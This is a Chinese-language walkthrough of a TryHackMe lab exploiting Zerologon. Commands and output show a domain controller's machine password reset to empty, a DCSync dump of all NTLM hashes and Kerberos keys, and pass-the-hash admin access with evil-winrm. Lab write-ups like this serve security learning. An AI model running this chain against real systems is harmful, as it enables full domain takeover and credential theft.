
关于理论部分参考[这篇文章](https://www.anquanke.com/post/id/219374)

目标靶机使用了tryhackme里的[这台机器](https://tryhackme.com/room/zer0logon)

利用github上的[这个](https://github.com/Sq00ky/Zero-Logon-Exploit)利用脚本

第一个参数是DC计算机的名字，第二个是IP

这一步会把域控DC01(即DC01\$用户)的密码置为空

```
(impacketEnv) root@ip-10-10-61-27:~/impacketEnv/Zero-Logon-Exploit# ./zeroLogon-NullPass.py DC01 10.10.177.160

 _____                   __                         
/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __  
\// / / _ \ '__/ _ \   / /  / _ \ / _` |/ _ \| '_ \ 
 / //\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |
/____/\___|_|  \___/  \____/\___/ \__, |\___/|_| |_|
                                  |___/             
                Vulnerability Discovered by Tom Tervoort
                              Exploit by Ronnie Bartwitz
  
Performing authentication attempts...
Failure to Autheticate at attempt number: 52
Zero Logon successfully exploited, changing password.
```
已成功重置了计算机的密码

接下来使用空密码就可以进行Dcsync(直接登录不行吗？在拥有域控的机器用户密码的情况下，并不能直接使用该密码登录域控，因为机器用户是不可以登录的，但是因为域控的机器用户具备Dcsync特权，我们就可以滥用该特权来进行Dcsync)

这里面我们使用impacket套件里面的secretsdump来进行Dcsync

使用secretsdump.py导出计算机上的所有NTML哈希
```
(impacketEnv) root@ip-10-10-61-27:~/impacketEnv/Zero-Logon-Exploit# /opt/impacket/examples/secretsdump.py -just-dc -no-pass DC01\$@10.10.177.160
Impacket v0.9.25.dev1+20220218.140931.6042675a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::
hololive.local\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
hololive.local\a-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::
hololive.local\matsurin:1107:aad3b435b51404eeaad3b435b51404ee:a4c59da4140ebd8c59410370c687ef51:::
hololive.local\fubukis:1108:aad3b435b51404eeaad3b435b51404ee:f78bb88e1168abfa165c558e97da9fd4:::
hololive.local\koronei:1109:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
hololive.local\okayun:1110:aad3b435b51404eeaad3b435b51404ee:a170447f161e5c11441600f0a1b4d93f:::
hololive.local\watamet:1115:aad3b435b51404eeaad3b435b51404ee:50f91788ee209b13ca14e54af199a914:::
hololive.local\mikos:1116:aad3b435b51404eeaad3b435b51404ee:74520070d63d3e2d2bf58da95de0086c:::
DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:3415e858d1caff75baeb02c4dd7154328ea6c87f07336a5c926014392a40ed49
Administrator:aes128-cts-hmac-sha1-96:535501623337ae03580527692f08f0e1
Administrator:des-cbc-md5:bf34685d383e6734
krbtgt:aes256-cts-hmac-sha1-96:9702af2b67c5497940d0f0a7237fbd53d18fb2923fadd37f4ba33d6d5dab4583
krbtgt:aes128-cts-hmac-sha1-96:81628713bd5608becc4325052eb9702d
krbtgt:des-cbc-md5:25f1cea1542f9e31
hololive.local\a-koronei:aes256-cts-hmac-sha1-96:8085b97e73f4dfa6e2cc52a885dd3b1339bf17c17e999a8863686bdf0d800763
hololive.local\a-koronei:aes128-cts-hmac-sha1-96:2f6fd0c9e56a00883ab21544791becab
hololive.local\a-koronei:des-cbc-md5:89df5b3b9b680ea1
hololive.local\a-fubukis:aes256-cts-hmac-sha1-96:7b675daa6cd54ae667a2726a5d99259638b29467fd8e4b3cd6ec4e9564a168dd
hololive.local\a-fubukis:aes128-cts-hmac-sha1-96:883e1d7b14b9024527bd7da69c80a350
hololive.local\a-fubukis:des-cbc-md5:94294304ec7637c1
hololive.local\matsurin:aes256-cts-hmac-sha1-96:cfde1ad860382daa706dd11d585ff1512eef873dc85ae9a88437dc7501fa8e04
hololive.local\matsurin:aes128-cts-hmac-sha1-96:08a011409d044e2f1aec7a6782cbd7b5
hololive.local\matsurin:des-cbc-md5:04fde39d61c215fe
hololive.local\fubukis:aes256-cts-hmac-sha1-96:ed8e594f0b6b89cfa8030bcf9f3e41a9668793a12f598e42893fe8c9f6c5b8eb
hololive.local\fubukis:aes128-cts-hmac-sha1-96:ee003acb55927bb733826aa9a9ddfb53
hololive.local\fubukis:des-cbc-md5:075b8ffde398fe80
hololive.local\koronei:aes256-cts-hmac-sha1-96:6df316ac8564b8254457d973ad61a71a1dfcc5ffe6218cb39f14bb0bbda4a287
hololive.local\koronei:aes128-cts-hmac-sha1-96:6afe7f4196657648505d2af9bbfaf8ba
hololive.local\koronei:des-cbc-md5:a737e6073d15aecd
hololive.local\okayun:aes256-cts-hmac-sha1-96:cf262ddfb3239a555f9d78f90b8c01cd51032d34d104d366b4a94749b47fe6c5
hololive.local\okayun:aes128-cts-hmac-sha1-96:53be14aa0da3f7b657e42c5ed1cef12a
hololive.local\okayun:des-cbc-md5:10896d3786b9628f
hololive.local\watamet:aes256-cts-hmac-sha1-96:45f99941cfc277515aff47a4dfc936e805f7fedd3d175524708c868e2c405ec9
hololive.local\watamet:aes128-cts-hmac-sha1-96:07a6307a5b58f33a61271516ac3364cc
hololive.local\watamet:des-cbc-md5:bf622564a840f192
hololive.local\mikos:aes256-cts-hmac-sha1-96:aab547ee10782fef9aea3b4be5392e7ca9605d0dca95f7510dca40b9628f4233
hololive.local\mikos:aes128-cts-hmac-sha1-96:5c56246d1fd7a4db5ff4fb65ba597e42
hololive.local\mikos:des-cbc-md5:6b2f7fa7a4ecd0c1
DC01$:aes256-cts-hmac-sha1-96:dbf8dbaaccbf17d6fb96cbb3c4046099a4a41d1453ff2d8a8970216ed15d9bf8
DC01$:aes128-cts-hmac-sha1-96:4c146fe76ec6150267564d9bd69769d8
DC01$:des-cbc-md5:cd161923ab9ec11c
[*] Cleaning up... 

```

使用evil-winrm的哈希传递登录DC
```
┌──(root💀kali)-[~/tryhackme/ZeroLogon]
└─# evil-winrm -i 10.10.177.160  -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hololive\administrator

```



